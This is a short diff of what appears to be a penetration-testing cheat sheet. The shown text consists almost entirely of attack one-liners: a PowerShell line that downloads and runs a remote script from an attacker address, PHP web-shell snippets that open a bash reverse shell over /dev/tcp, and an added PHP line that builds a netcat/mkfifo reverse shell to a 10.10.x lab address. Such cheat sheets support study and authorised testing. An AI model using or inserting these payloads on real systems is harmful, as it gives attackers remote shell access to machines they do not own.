@@ -1095,6 +1095,8 @@ PowerShell "IEX(New-Object Net.WebClient).downloadString('http://IP_ATTACK/rev.p
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.xx.xx/443 0>&1'"); ?>
 # or
 <?php system('id');?>
+# or
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.122 666 >/tmp/f"); ?>
 ```
 
 - If you have a web shell, you can obtain a bash one using this php command:
